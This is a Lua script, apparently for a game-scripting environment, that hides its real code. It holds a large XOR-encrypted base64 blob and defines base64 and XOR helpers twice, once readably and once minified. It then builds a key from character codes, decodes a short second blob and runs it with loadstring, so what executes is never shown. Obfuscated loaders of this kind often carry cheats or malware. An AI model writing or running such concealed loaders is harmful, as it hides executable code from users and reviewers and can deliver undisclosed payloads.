local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function base64decode(data)
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if x == '=' then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i - f%2^(i-1) > 0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if #x ~= 8 then return '' end
        local c=0
        for i=1,8 do c=c + (x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

function xor(data, key)
    local res = ""
    for i = 1, #data do
        local k = key:byte((i - 1) % #key + 1)
        res = res .. string.char(bit32.bxor(data:byte(i), k))
    end
    return res
end

local encrypted = "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"
local _b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local function _B(d)return(d:gsub('.',function(x)if x=='='then return''end local r,f='',(_b:find(x)-1)for i=6,1,-1 do r=r..(f%2^i - f%2^(i-1)>0 and'1'or'0')end return r end):gsub('%d%d%d?%d?%d?%d?%d?%d?',function(x)if#x~=8 then return''end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1'and 2^(8-i)or 0)end return string.char(c)end)end
local function _X(d,k)local r=""for i=1,#d do r=r..string.char(d:byte(i)~k:byte((i-1)%#k+1))end return r end

local _k=string.char(112,108,110,104,49,50,51)
local _e = "Cw8ZHBxcCjMHThkNGA4dVwsCHRE="

loadstring(_X(_B(_e),_k))()
